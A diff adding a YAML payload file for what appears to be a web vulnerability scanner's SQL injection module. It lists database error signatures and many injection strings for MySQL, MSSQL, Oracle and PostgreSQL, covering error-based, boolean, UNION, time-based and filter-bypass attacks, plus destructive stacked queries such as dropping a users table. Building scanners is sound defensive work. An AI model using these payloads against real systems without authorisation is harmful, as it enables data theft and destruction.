@@ -1,0 +1,99 @@
+name: SQL Injection
+type: sqli
+description: "SQL injection test payloads — error-based, boolean-based, time-based, UNION-based, comment variations"
+signatures:
+  - "SQL syntax"
+  - "mysql_fetch"
+  - "ORA-"
+  - "Microsoft SQL"
+  - "sqlite3"
+  - "PostgreSQL"
+  - "Warning: pg_"
+  - "You have an error in your SQL"
+  - "Unclosed quotation"
+  - "SQLSTATE"
+  - "mysql_num_rows"
+  - "supplied argument is not a valid MySQL"
+  - "ORA-01756"
+  - "SQLiteException"
+  - "Syntax error"
+  - "DB2 SQL error"
+  - "[Microsoft][ODBC SQL Server Driver]"
+  - "Incorrect syntax near"
+payloads:
+  # --- Базовые probe ---
+  - "'"
+  - "''"
+  - "`"
+  - "\")"
+  - "1)"
+
+  # --- Error-based (MySQL) ---
+  - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- -"
+  - "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
+  - "' AND EXP(~(SELECT * FROM(SELECT user())a)) -- -"
+  - "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) -- -"
+
+  # --- Error-based (MSSQL) ---
+  - "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) -- -"
+  - "'; SELECT 1/0 -- -"
+
+  # --- Error-based (Oracle) ---
+  - "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) -- -"
+  - "' OR 1=1 --"
+
+  # --- Boolean-based ---
+  - "1' AND '1'='1"
+  - "1' AND '1'='2"
+  - "' OR 1=1 -- -"
+  - "' OR 'x'='x"
+  - "' OR 'x'='y"
+  - "1 AND 1=1"
+  - "1 AND 1=2"
+  - "admin'--"
+  - "' OR 1=1#"
+  - "') OR ('1'='1"
+
+  # --- UNION-based ---
+  - "' UNION SELECT NULL -- -"
+  - "' UNION SELECT NULL,NULL -- -"
+  - "' UNION SELECT NULL,NULL,NULL -- -"
+  - "' UNION SELECT 1,user(),3 -- -"
+  - "' UNION SELECT 1,database(),3,4 -- -"
+  - "' UNION ALL SELECT NULL,NULL,NULL,NULL -- -"
+  - "1 UNION SELECT 1,@@version,3 -- -"
+  - "1 UNION SELECT table_name,2,3 FROM information_schema.tables LIMIT 1 -- -"
+
+  # --- Time-based (MySQL) ---
+  - "' AND SLEEP(5) -- -"
+  - "1' AND SLEEP(5) AND '1'='1"
+  - "'; WAITFOR DELAY '0:0:5' -- -"
+  - "1; WAITFOR DELAY '0:0:5' -- -"
+  - "' OR SLEEP(5) -- -"
+
+  # --- Time-based (PostgreSQL) ---
+  - "'; SELECT pg_sleep(5) -- -"
+  - "1; SELECT pg_sleep(5) -- -"
+
+  # --- Time-based (Oracle) ---
+  - "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)=CHR(65) -- -"
+
+  # --- Комментарии ---
+  - "' -- -"
+  - "' #"
+  - "' /*"
+  - "1-- -"
+  - "1#"
+  - "1/*"
+
+  # --- Stacked queries ---
+  - "'; DROP TABLE users -- -"
+  - "1; INSERT INTO users(username,password) VALUES('hacked','hacked') -- -"
+
+  # --- Обход фильтров ---
+  - "' /*!UNION*/ /*!SELECT*/ NULL -- -"
+  - "'/**/OR/**/1=1 -- -"
+  - "' UNION%20SELECT%20NULL -- -"
+  - "'%20OR%20'1'%3D'1"
+  - "' OR 0x31=0x31 -- -"
+  - "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' -- -"
